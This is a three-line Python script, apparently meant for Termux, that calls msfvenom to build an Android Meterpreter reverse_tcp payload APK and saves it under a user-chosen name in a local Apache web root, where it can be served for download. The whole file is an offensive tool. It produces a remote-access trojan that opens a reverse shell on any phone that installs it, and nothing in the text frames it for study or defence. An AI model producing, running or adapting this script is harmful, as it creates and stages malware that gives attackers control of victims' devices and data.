import os
cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R> /data/data/com.termux/files/usr/share/apache2/default-site/htdocs/{name}+.apk".format(name = input("Enter Payload Name: "))
os.system(cmd)
